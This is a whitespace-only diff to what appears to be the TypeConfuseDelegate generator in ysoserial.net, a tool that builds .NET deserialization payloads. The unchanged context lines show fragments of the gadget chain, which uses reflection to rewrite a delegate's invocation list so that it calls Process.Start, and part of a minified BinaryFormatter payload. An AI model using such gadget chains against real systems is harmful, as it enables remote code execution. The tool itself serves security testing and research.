@@ -38,12 +38,12 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            if(inputArgs.Minify && inputArgs.UseSimpleType && 
+            if(inputArgs.Minify && inputArgs.UseSimpleType &&
                 (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
             {
                 // This is to provide even a smaller payload
                 inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
-                
+
                 string tcd_json_minified = @"[{'Id': 1,
     'Data': {
       '$type': 'SerializationHeaderRecord',
@@ -421,7 +421,7 @@ namespace ysoserial.Generators
             {
                 inputArgs.Cmd = cmdFromFile;
             }
-            
+
             Delegate da = new Comparison<string>(String.Compare);
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
@@ -435,7 +435,7 @@ namespace ysoserial.Generators
             {
                 set.Add("");
             }
-            
+
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
@@ -444,7 +444,7 @@ namespace ysoserial.Generators
 
             return set;
         }
-        
+
         public static object GetXamlGadget(string xaml_payload)
         {
             Delegate da = new Comparison<string>(String.Compare);
@@ -460,6 +460,6 @@ namespace ysoserial.Generators
             fi.SetValue(d, invoke_list);
             return set;
         }
-        
+
     }
 }
